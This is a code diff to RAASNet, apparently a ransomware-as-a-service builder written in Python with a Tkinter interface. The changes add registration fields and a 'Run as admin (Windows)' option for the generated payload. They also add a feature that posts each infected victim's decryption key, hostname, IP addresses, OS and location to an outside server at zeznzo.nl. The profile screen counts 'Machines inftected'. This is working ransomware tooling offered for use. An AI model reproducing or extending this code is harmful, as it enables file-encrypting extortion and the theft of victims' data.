@@ -39,7 +39,7 @@ but can easily be coded into it as a nice feature.
 __author__ = "Leon Voerman"
 __copyright__ = "Copyright 2019, Incoming Security"
 __license__ = "GPLv3"
-__version__ = "1.2.4"
+__version__ = "1.2.6"
 __maintainer__ = "Leon Voerman"
 __email__ = "I don't need spam, open an issue on GitHub, thank you :)"
 __status__ = "Production"
@@ -129,8 +129,6 @@ class Login(Tk):
         Tk.__init__(self)
         self.title(string = "Login")
         self.resizable(0,0)
-        #self.style = Style()
-        #self.style.theme_use("clam")
         self.ttkStyle = ThemedStyle()
         self.ttkStyle.set_theme("ubuntu")
         self.configure(background = 'white')
@@ -141,6 +139,9 @@ class Login(Tk):
             'username' : StringVar(),
             'pwd' : StringVar(),
             'reg_username' : StringVar(),
+            'reg_name' : StringVar(),
+            'reg_surname' : StringVar(),
+            'reg_email' : StringVar(),
             'reg_password' : StringVar(),
             'reg_check_password' : StringVar(),
         }
@@ -180,16 +181,26 @@ class Login(Tk):
 
         payload = {'user': self.options['username'].get(), 'pwd': check_pwd}
 
-        r = requests.post('https://zeznzo.nl/login.php', params=payload)
+        r = requests.post('https://zeznzo.nl/login.py', data=payload)
         if r.status_code == 200:
             if r.text.startswith('[ERROR]'):
                 messagebox.showwarning('ERROR', r.text.split('[ERROR] ')[1])
                 return
             elif r.text.startswith('[OK]'):
-                self.destroy()
-                main = MainWindow(self.options['username'].get(), self.options['pwd'].get())
-                main.mainloop()
+                data = r.text[13:]
+                data = data.split('\n')
+                prof = {}
 
+                try:
+                    for i in data:
+                        i = i.split('=')
+                        prof[i[0]] = i[1]
+                except Exception:
+                    pass
+
+                self.destroy()
+                main = MainWindow(self.options['username'].get(), self.options['pwd'].get(), prof['Email'], prof['Name'], prof['Surname'], prof['Rank'], prof['Status'])
+                main.mainloop()
         else:
             messagebox.showwarning('ERROR', 'Failed to contact login server!\n%i' % r.status_code)
             return
@@ -223,25 +234,36 @@ class Login(Tk):
         self.options['reg_username'].grid(row = 2, column = 0, columnspan = 2)
         self.options['reg_username'].focus()
 
-        Label(self.reg, text = 'Password', background = 'white').grid(row = 3, column = 0, columnspan = 2)
-        self.options['reg_password'] = Entry(self.reg, textvariable = self.options['reg_password'], width = 30, show = '*')
-        self.options['reg_password'].grid(row = 4, column = 0, columnspan = 2)
+        Label(self.reg, text = 'Name', background = 'white').grid(row = 3, column = 0, columnspan = 2)
+        self.options['reg_name'] = Entry(self.reg, textvariable = self.options['reg_name'], width = 30)
+        self.options['reg_name'].grid(row = 4, column = 0, columnspan = 2)
 
-        Label(self.reg, text = 'Confirm Password', background = 'white').grid(row = 5, column = 0, columnspan = 2)
+        Label(self.reg, text = 'Surname', background = 'white').grid(row = 5, column = 0, columnspan = 2)
+        self.options['reg_surname'] = Entry(self.reg, textvariable = self.options['reg_surname'], width = 30)
+        self.options['reg_surname'].grid(row = 6, column = 0, columnspan = 2)
+
+        Label(self.reg, text = 'Email', background = 'white').grid(row = 7, column = 0, columnspan = 2)
+        self.options['reg_email'] = Entry(self.reg, textvariable = self.options['reg_email'], width = 30)
+        self.options['reg_email'].grid(row = 8, column = 0, columnspan = 2)
+
+        Label(self.reg, text = 'Password', background = 'white').grid(row = 9, column = 0, columnspan = 2)
+        self.options['reg_password'] = Entry(self.reg, textvariable = self.options['reg_password'], width = 30, show = '*')
+        self.options['reg_password'].grid(row = 10, column = 0, columnspan = 2)
+
+        Label(self.reg, text = 'Confirm Password', background = 'white').grid(row = 11, column = 0, columnspan = 2)
         self.options['reg_check_password'] = Entry(self.reg, textvariable = self.options['reg_check_password'], width = 30, show = '*')
-        self.options['reg_check_password'].grid(row = 6, column = 0, columnspan = 2)
+        self.options['reg_check_password'].grid(row = 12, column = 0, columnspan = 2)
 
         register_button = Button(self.reg, text = 'Register', command = self.register_user, width = 35)
-        register_button.grid(row = 7, column = 0, columnspan = 2)
+        register_button.grid(row = 13, column = 0, columnspan = 2)
         self.reg.bind('<Return>', self.register_user_event)
-        close_register = Button(self.reg, text = 'Cancel', command = self.reg.destroy, width = 35).grid(row = 8, column = 0, columnspan = 2)
+        close_register = Button(self.reg, text = 'Cancel', command = self.reg.destroy, width = 35).grid(row = 14, column = 0, columnspan = 2)
 
 
     def register_user_event(self, event):
         self.register_user()
 
     def register_user(self):
-
         # Check if passwords match
         if not self.options['reg_password'].get() == self.options['reg_check_password'].get():
             messagebox.showwarning('ERROR', 'Passwords do not match!')
@@ -250,7 +272,7 @@ class Login(Tk):
             pass
 
         # Check if every entry was filled
-        if self.options['reg_username'].get() == '' or self.options['reg_password'].get() == '':
+        if self.options['reg_username'].get() == '' or self.options['reg_password'].get() == '' or self.options['reg_name'].get() == '' or self.options['reg_surname'].get() == ''  or self.options['reg_email'].get() == '' :
             messagebox.showwarning("ERROR", "Not all fields were filled!")
             return
         else:
@@ -258,9 +280,9 @@ class Login(Tk):
 
         # check if username already exists
         try:
-            payload = {'user': self.options['reg_username'].get(), 'pwd': hashlib.sha256(self.options['reg_password'].get().encode('utf-8')).hexdigest()}
+            payload = {'user': self.options['reg_username'].get(), 'pwd': hashlib.sha256(self.options['reg_password'].get().encode('utf-8')).hexdigest(), 'name' : self.options['reg_name'].get(), 'surname' : self.options['reg_surname'].get(), 'email' : self.options['reg_email'].get()}
 
-            r = requests.post('https://zeznzo.nl/reg.php', params=payload)
+            r = requests.post('https://zeznzo.nl/reg.py', data=payload)
             if r.status_code == 200:
                 if r.text.startswith('[ERROR]'):
                     messagebox.showwarning('ERROR', r.text.split('[ERROR] ')[1])
@@ -279,7 +301,7 @@ class Login(Tk):
         self.reg.destroy()
 
 class MainWindow(Tk):
-    def __init__(self, username, password):
+    def __init__(self, username, password, email, name, surname, rank, status):
         Tk.__init__(self)
         self.title(string = "RAASNet v%s" % __version__) # Set window title
         self.resizable(0,0) # Do not allow to be resized
@@ -307,6 +329,7 @@ class MainWindow(Tk):
             'agreed' : IntVar(),
             'host' : StringVar(),
             'port' : IntVar(),
+            'save_keys' : IntVar(),
             'remote' : StringVar(),
             'local' : StringVar(),
             'platform' : StringVar(),
@@ -331,12 +354,15 @@ class MainWindow(Tk):
             'working_dir' : StringVar(),
             'new_working_dir' : StringVar(),
             'remove_payload' : IntVar(),
+            'runas' : IntVar(),
 
             'username' : StringVar(),
             'password' : StringVar(),
-            'status' : StringVar(),
-            'lic' : StringVar(),
+            'email' : StringVar(),
+            'name' : StringVar(),
+            'surname' : StringVar(),
             'rank' : StringVar(),
+            'status' : StringVar(),
             'inf_counter' : IntVar(),
 
         }
@@ -351,14 +377,17 @@ class MainWindow(Tk):
         # Load profile
         self.options['username'].set(username)
         self.options['password'].set(password)
-        self.options['status'].set('Active')
-        self.options['lic'].set('FREE')
-        self.options['rank'].set('User')
+        self.options['email'].set(email)
+        self.options['name'].set(name)
+        self.options['surname'].set(surname)
+        self.options['rank'].set(rank)
+        self.options['status'].set(status)
         self.options['inf_counter'].set(0)
 
         # Default Settings
         self.options['host'].set('127.0.0.1')
         self.options['port'].set(8989)
+        self.options['save_keys'].set(0)
         self.options['full_screen_var'].set(0)
         self.options['mode'].set(1)
         self.options['demo'].set(0)
@@ -366,6 +395,7 @@ class MainWindow(Tk):
         self.options['debug'].set(0)
         self.options['ext'].set('.DEMON')
         self.options['remove_payload'].set(0)
+        self.options['runas'].set(0)
         self.options['working_dir'].set('$HOME')
 
         self.options['target_dirs'].set('''Downloads
@@ -615,17 +645,23 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Label(self.prof, text = 'Username: ', background = 'white').grid(row = 1, column = 0, sticky = 'w')
         Label(self.prof, text = self.options['username'].get(), background = 'white').grid(row = 1, column = 1, sticky = 'w')
 
-        Label(self.prof, text = 'Status: ', background = 'white').grid(row = 2, column = 0, sticky = 'w')
-        Label(self.prof, text = self.options['status'].get(), background = 'white').grid(row = 2, column = 1, sticky = 'w')
+        Label(self.prof, text = 'Email: ', background = 'white').grid(row = 2, column = 0, sticky = 'w')
+        Label(self.prof, text = self.options['email'].get(), background = 'white').grid(row = 2, column = 1, sticky = 'w')
 
-        Label(self.prof, text = 'License: ', background = 'white').grid(row = 3, column = 0, sticky = 'w')
-        Label(self.prof, text = self.options['lic'].get(), background = 'white').grid(row = 3, column = 1, sticky = 'w')
+        Label(self.prof, text = 'Name: ', background = 'white').grid(row = 3, column = 0, sticky = 'w')
+        Label(self.prof, text = self.options['name'].get(), background = 'white').grid(row = 3, column = 1, sticky = 'w')
 
-        Label(self.prof, text = 'Rank: ', background = 'white').grid(row = 4, column = 0, sticky = 'w')
-        Label(self.prof, text = self.options['rank'].get(), background = 'white').grid(row = 4, column = 1, sticky = 'w')
+        Label(self.prof, text = 'Surname: ', background = 'white').grid(row = 4, column = 0, sticky = 'w')
+        Label(self.prof, text = self.options['surname'].get(), background = 'white').grid(row = 4, column = 1, sticky = 'w')
 
-        Label(self.prof, text = 'Machines inftected: ', background = 'white').grid(row = 5, column = 0, sticky = 'w')
-        Label(self.prof, text = self.options['inf_counter'].get(), background = 'white').grid(row = 5, column = 1, sticky = 'w')
+        Label(self.prof, text = 'Rank: ', background = 'white').grid(row = 5, column = 0, sticky = 'w')
+        Label(self.prof, text = self.options['rank'].get(), background = 'white').grid(row = 5, column = 1, sticky = 'w')
+
+        Label(self.prof, text = 'Status: ', background = 'white').grid(row = 6, column = 0, sticky = 'w')
+        Label(self.prof, text = self.options['status'].get(), background = 'white').grid(row = 6, column = 1, sticky = 'w')
+
+        Label(self.prof, text = 'Machines inftected: ', background = 'white').grid(row = 7, column = 0, sticky = 'w')
+        Label(self.prof, text = self.options['inf_counter'].get(), background = 'white').grid(row = 7, column = 1, sticky = 'w')
 
         delete = Button(self.prof, text = "DELETE PROFILE", command = self.upgrade, width = 53)
         delete.grid(row = 6, column = 0, columnspan = 2)
@@ -634,7 +670,15 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         upg = Button(self.prof, text = "UPGRADE", command = self.upgrade, width = 53)
         upg.grid(row = 7, column = 0, columnspan = 2)
 
+    def exploit_options(self):
+        self.exp = Toplevel()
+        self.exp.title(string = 'Exploit Options')
+        self.exp.configure(background = 'white')
+        self.exp.resizable(0,0)
 
+        self.bind("<Escape>", self.close_exploit) # Press ESC to quit app
+
+        Label(self.exp, text = 'Spoof extention', background = 'white').grid(row = 0, column = 0)
 
     def open_server(self):
         self.set = Toplevel()
@@ -650,6 +694,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Label(self.set, text = 'port', background = 'white').grid(row = 3, column = 0, sticky = 'w')
         port = Entry(self.set, textvariable = self.options['port'], width = 30)
         port.grid(row = 4, column = 0, columnspan = 2)
+
+        Checkbutton(self.set, text = "Save keys to raasnet.zeznzo.nl account", variable = self.options['save_keys'], onvalue = 1, offvalue = 0).grid(row = 5, column = 0, columnspan = 2, sticky = 'w')
 
         if host == None or host == '':
             messagebox.showwarning('ERROR', 'Invalid host!')
@@ -910,12 +956,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
         Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)
 
-        options_frame = LabelFrame(self.gen, text = 'Options')
-        options_frame.grid(row = 0, column = 2, sticky = 'nw')
-        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
-        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
-        Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
-
         content_frame = LabelFrame(self.gen, text = 'Content')
         content_frame.grid(row = 1, column = 0, sticky = 'nw')
         set_msg = Button(content_frame, text = 'CUSTOM MESSAGE', command = self.set_msg, width = 25).grid(row = 0, column = 0)
@@ -927,10 +967,18 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         set_dirs = Button(target_frame, text = 'SET TARGET DIRS', command = self.set_dirs, width = 25).grid(row = 0, column = 0)
 
         enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
-        enc_frame.grid(row = 1, column = 2, sticky = 'w')
+        enc_frame.grid(row = 0, column = 2, sticky = 'w')
         Radiobutton(enc_frame, text = 'Ghost (Fastest)', variable = self.options['type'], value = 'ghost').grid(row = 0, column = 0, sticky = 'w')
         Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 1, column = 0, sticky = 'w')
         Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 2, column = 0, sticky = 'w')
+
+        options_frame = LabelFrame(self.gen, text = 'Options')
+        options_frame.grid(row = 1, column = 2, sticky = 'nw')
+        Checkbutton(options_frame, text = 'Demo', variable = self.options['demo'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Debug', variable = self.options['debug'], onvalue = 1, offvalue = 0).grid(row = 1, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
+        Checkbutton(options_frame, text = 'Run as admin (Windows)', variable = self.options['runas'], onvalue = 1, offvalue = 0).grid(row = 3, column = 0, sticky = 'w')
+
 
         finish_frame = LabelFrame(self.gen, text = 'Finish')
         finish_frame.grid(row = 2, column = 0, columnspan = 1, sticky = 'w')
@@ -1017,11 +1065,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     def check_settings(self):
         if self.options['mode'].get() == 2:
             self.options['full_screen_var'].set(0)
-            #messagebox.showwarning('Disabled', 'Fullscreen is available for GUI mode only, this option have been disabled!')
 
     def make_demon(self):
 
-        print(self.options['working_dir'].get())
         try:
             create_demon(self.options['host'].get(),
                 self.options['port'].get(),
@@ -1035,7 +1081,8 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['target_ext'].get(),
                 self.options['target_dirs'].get(),
                 self.options['remove_payload'].get(),
-                self.options['working_dir'].get())
+                self.options['working_dir'].get(),
+                self.options['runas'].get())
         except Exception as e:
             messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)
             return
@@ -1113,6 +1160,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
     def start_server(self):
         host = self.options['host'].get()
         port = self.options['port'].get()
+        save_keys = self.options['save_keys'].get()
         socket_list = []
 
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1178,6 +1226,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             self.serv.options['log'].insert(END, result, 'yellow')
                             self.serv.options['log'].see(END)
 
+                            if save_keys == 1:
+                                payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'Region' : region, 'City' : city , 'ISP' : isp, 'ZIP' : zip}
+                                r = requests.post('https://zeznzo.nl/post.py', data=payload)
                         else:
                             break
 
@@ -1266,6 +1317,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def close_profile(self, event):
         self.prof.destroy()
+
+    def close_exploit(self, event):
+        self.exp.destroy()
 
     def close_server(self, event):
         self.server_socket.close()
